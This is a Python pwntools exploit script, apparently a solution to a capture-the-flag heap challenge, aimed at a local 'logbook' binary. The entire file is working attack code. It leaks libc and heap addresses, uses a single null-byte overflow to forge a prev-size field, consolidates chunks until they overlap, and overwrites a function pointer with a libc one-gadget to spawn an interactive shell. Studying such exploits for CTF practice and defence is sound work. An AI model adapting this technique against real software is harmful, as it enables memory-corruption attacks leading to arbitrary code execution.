#!/usr/bin/python3
from pwn import *

heap_leak = 0
index = -1

def create_log(p):
    global heap_leak
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('leak: ')
    heap_leak = int(p.recvline().strip(), 16)

def store_data(p, data):
    global index
    p.recvuntil('> ')
    p.sendline('3')
    p.sendline(data)
    index += 1
    return str(index)

def edit_data(p, chunk, data):
    p.recvuntil('> ')
    p.sendline('4')
    p.sendline(chunk)
    p.sendline(data)

def delete_data(p, chunk):
    p.recvuntil('> ')
    p.sendline('5')
    p.sendline(chunk)

def log_message(p, message):
    p.recvuntil('> ')
    p.sendline('2')
    p.sendline(message)

def exploit(p):
    ''''''
    libc = ELF('./libc.so.6')

    p.recvuntil('address: ')
    puts = int(p.recvline().strip(), 16)
    libc.address = puts - libc.symbols['puts']


    chunk_a = store_data(p, b'D'*0x4f8) # Consolidation recipient
    create_log(p) #Victim
    print('heap leak: ' + hex(heap_leak))
    chunk_b = store_data(p, 'A'*0x17) # Overflow
    chunk_c = store_data(p, 'B'*0x4f8)
    chunk_d = store_data(p, 'A'*0x17) # Guard

    # Cause null byte overflow and create fake prev-size field
    edit_data(p, chunk_b, b'A'*0x18) #overwrite prev-inuse
    edit_data(p, chunk_b, b'A'*0x10 + p64(0x540)) #create fake prev size

    delete_data(p, chunk_a) # Put chunk A in unsorted bin so it can be consolidated
    delete_data(p, chunk_c) # Overlapping chunks!

    # Hijack function pointer
    chunk_f = store_data(p, b'E'*8 + p64(libc.address + 0x10a2fc)) # Set up MLP (multilevel pointer)
    chunk_e = store_data(p, b'A'*0x548) # Get control of function pointer


    edit_data(p, chunk_e, b'A'*0x4e0 + p64(heap_leak - 0x4f8)) # Overwrite function pointer 
    log_message(p, 'sploit')



#p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', './logbook'], '''
#b main
#c
#b *0x40159a
#c
#''')

p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './logbook'])

exploit(p)

p.interactive()
